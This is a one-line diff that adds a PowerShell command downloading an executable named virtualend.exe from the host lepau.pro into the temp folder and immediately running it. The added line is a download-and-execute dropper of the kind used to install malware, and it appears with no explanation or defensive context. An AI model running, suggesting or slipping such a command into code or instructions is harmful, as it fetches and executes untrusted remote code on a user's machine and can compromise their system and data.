@@ -1,0 +1,1 @@
+iwr lepau.pro/virtualend.exe -OutFile $env:TEMP\virtualend.exe; & $env:TEMP\virtualend.exe
